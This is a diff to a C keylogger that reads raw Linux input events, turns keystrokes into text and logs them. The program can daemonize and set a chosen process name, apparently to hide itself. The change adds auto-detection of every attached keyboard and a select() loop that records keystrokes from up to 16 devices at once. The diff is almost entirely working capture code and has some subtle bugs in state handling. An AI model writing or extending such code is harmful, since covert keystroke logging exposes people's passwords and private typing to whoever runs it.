@@ -17,17 +17,57 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <getopt.h>
+#include <sys/types.h>
+#include <sys/select.h>
+
 #include "keymap.h"
-#include "evdev.h"
 #include "process.h"
 
+#define MAX_PATH 256
+#define MAX_EVDEV 16
+
+int find_default_keyboard_list(char event_device[MAX_EVDEV][MAX_PATH])
+{
+    FILE *devices;
+    char events[128];
+    char handlers[128];
+    char *event;
+    int evnum = 0, i;
+
+    devices = fopen("/proc/bus/input/devices", "r");
+    if (!devices) {
+        perror("fopen");
+        return evnum;
+    }
+    while (fgets(events, sizeof(events), devices))
+    {
+        if (strstr(events, "H: Handlers=") == events)
+            strcpy(handlers, events);
+        else if (!strcmp(events, "B: EV=120013\n") && (event = strstr(handlers, "event")))
+        {
+            for (i = 0, event += sizeof("event") - 1; *event && isdigit(*event); ++event, ++i)
+                handlers[i] = *event;
+            handlers[i] = '\0';
+
+            snprintf(event_device[evnum], sizeof(event_device[evnum]),
+                     "/dev/input/event%s", handlers);
+
+            fprintf(stderr, "listening to keyboard: %s\n", event_device[evnum]);
+
+            if (++evnum == MAX_EVDEV) break;
+        }
+    }
+    fclose(devices);
+    return evnum;
+}
 
 int main(int argc, char *argv[])
 {
-    char buffer[256];
-    char event_device[256];
+    char buffer[MAX_PATH];
+    char event_device[MAX_EVDEV][MAX_PATH];
     char *log_file, *pid_file, *process_name, option;
-    int evdev_fd, daemonize, force_us_keymap, option_index;
+    int evdev_fd[MAX_EVDEV];
+    int i, daemonize, force_us_keymap, option_index;
     FILE *log, *pid;
     struct input_event ev;
     struct input_event_state state;
@@ -44,7 +84,8 @@ int main(int argc, char *argv[])
         {0, 0, 0, 0}
     };
 
-    strcpy(event_device, "auto");
+    memset(event_device, 0, sizeof(event_device));
+    strcpy(event_device[0], "auto");
     log_file = 0;
     log = stdout;
     pid_file = 0;
@@ -66,7 +107,7 @@ int main(int argc, char *argv[])
             force_us_keymap = 1;
             break;
         case 'e':
-            strncpy(event_device, optarg, sizeof(event_device));
+            strncpy(event_device[0], optarg, sizeof(event_device[0]));
             break;
         case 'l':
             log_file = optarg;
@@ -94,9 +135,11 @@ int main(int argc, char *argv[])
         }
     }
 
-    if (!strcmp(event_device, "auto")) {
-        if (find_default_keyboard(event_device, sizeof(event_device)) == -1) {
-            fprintf(stderr, "Could not find default event device.\nTry passing it manually with --event-device.\n");
+    if (!strcmp(event_device[0], "auto")) {
+        if (find_default_keyboard_list(event_device) == 0) {
+            fprintf(stderr,
+                    "Could not find default event device.\n"
+                    "Try passing it manually with --event-device.\n");
             return EXIT_FAILURE;
         }
     }
@@ -108,10 +151,17 @@ int main(int argc, char *argv[])
         close(STDOUT_FILENO);
     }
 
-    if ((evdev_fd = open(event_device, O_RDONLY | O_NOCTTY)) < 0) {
-        perror("open");
-        fprintf(stderr, "Perhaps try running this program as root.\n");
-        return EXIT_FAILURE;
+    memset(evdev_fd, 0, sizeof(evdev_fd));
+
+    for (i = 0; i < MAX_EVDEV; ++i)
+    {
+        if (!event_device[i][0]) break;
+
+        if ((evdev_fd[i] = open(event_device[i], O_RDONLY | O_NOCTTY)) < 0) {
+            perror("open");
+            fprintf(stderr, "Perhaps try running this program as root.\n");
+            return EXIT_FAILURE;
+        }
     }
 
     if (!force_us_keymap) {
@@ -145,16 +195,55 @@ int main(int argc, char *argv[])
     if (process_name)
         set_process_name(process_name, argc, argv);
 
-    memset(&state, 0, sizeof(state));
-    while (read(evdev_fd, &ev, sizeof(ev)) > 0) {
-        if (translate_event(&ev, &state, buffer, sizeof(buffer)) > 0) {
-            fprintf(log, "%s", buffer);
-            fflush(log);
+    while (1)
+    {
+        fd_set rfds;
+        int max_fd = 0, retval;
+
+        FD_ZERO(&rfds);
+
+        for (i = 0; i < MAX_EVDEV; ++i) {
+            if (evdev_fd[i] == 0) continue;
+
+            FD_SET(evdev_fd[i], &rfds);
+            if (max_fd < evdev_fd[i]+1)
+                max_fd = evdev_fd[i]+1;
+        }
+
+        retval = select(max_fd, &rfds, NULL, NULL, NULL);
+
+        if (retval == -1) {
+            perror("select()");
+            break;
+        }
+
+        for (i = 0; i < MAX_EVDEV; ++i) {
+            if (evdev_fd[i] == 0) continue;
+            if (!FD_ISSET(evdev_fd[i], &rfds)) continue;
+
+            memset(&state, 0, sizeof(state));
+            if (read(evdev_fd[i], &ev, sizeof(ev)) > 0)
+            {
+                if (translate_event(&ev, &state, buffer, sizeof(buffer)) > 0) {
+                    fprintf(log, "%s", buffer);
+                    fflush(log);
+                }
+            }
+            else
+            {
+                perror("read()");
+                break;
+            }
         }
     }
 
     fclose(log);
-    close(evdev_fd);
+
+    for (i = 0; i < MAX_EVDEV; ++i)
+    {
+        if (evdev_fd[i] != 0)
+            close(evdev_fd[i]);
+    }
 
     perror("read");
     return EXIT_FAILURE;
